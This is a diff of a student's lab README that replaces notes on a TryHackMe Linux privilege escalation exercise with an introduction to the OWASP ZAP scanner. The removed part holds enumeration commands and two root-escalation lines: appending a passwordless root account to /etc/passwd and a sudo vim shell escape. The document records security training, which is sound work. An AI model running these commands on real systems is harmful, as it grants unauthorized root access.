@@ -1,54 +1,36 @@
-# Linux Privilege Escalation - TryHackMe
+# OWASP ZAP - Introduction
 
 ## Overview
 
-This project demonstrates multiple privilege escalation techniques on a vulnerable Debian machine.
+This project covers the basics of OWASP ZAP, a web application security testing tool.
 
-## Tools Used
+## What is OWASP ZAP?
 
-* Kali Linux
-* SSH
-* Linux commands
+OWASP ZAP (Zed Attack Proxy) is an open-source tool used to find vulnerabilities in web applications.
 
-## Techniques Covered
+## Key Features
 
-* Weak File Permissions
-* SUID Exploitation
-* Sudo Misconfiguration
-* Cron Jobs Exploitation
-* Environment Variable Abuse
-* Password & Key Discovery
+* Intercept Proxy
+* Spider (Crawler)
+* Active Scan
+* Forced Browsing
+* Fuzzer
 
-## Enumeration Commands
+## How It Works
 
-```
-whoami
-id
-uname -a
-sudo -l
-find / -perm -4000 2>/dev/null
-```
+Browser → ZAP Proxy → Target Website
 
-## Exploitation Examples
+## Setup
 
-### Writable /etc/passwd
-
-```
-echo 'hacker::0:0:hacker:/root:/bin/bash' >> /etc/passwd
-```
-
-### Sudo Exploit
-
-```
-sudo vim
-:!bash
-```
+* Installed ZAP on Kali Linux
+* Configured browser proxy (127.0.0.1:8080)
+* Installed ZAP SSL certificate
 
 ## Learning Outcome
 
-* Learned privilege escalation techniques
-* Understood Linux misconfigurations
-* Practiced real-world attack scenarios
+* Understood web proxy concept
+* Learned how to intercept requests
+* Performed vulnerability scanning
 
 ## Screenshots
 
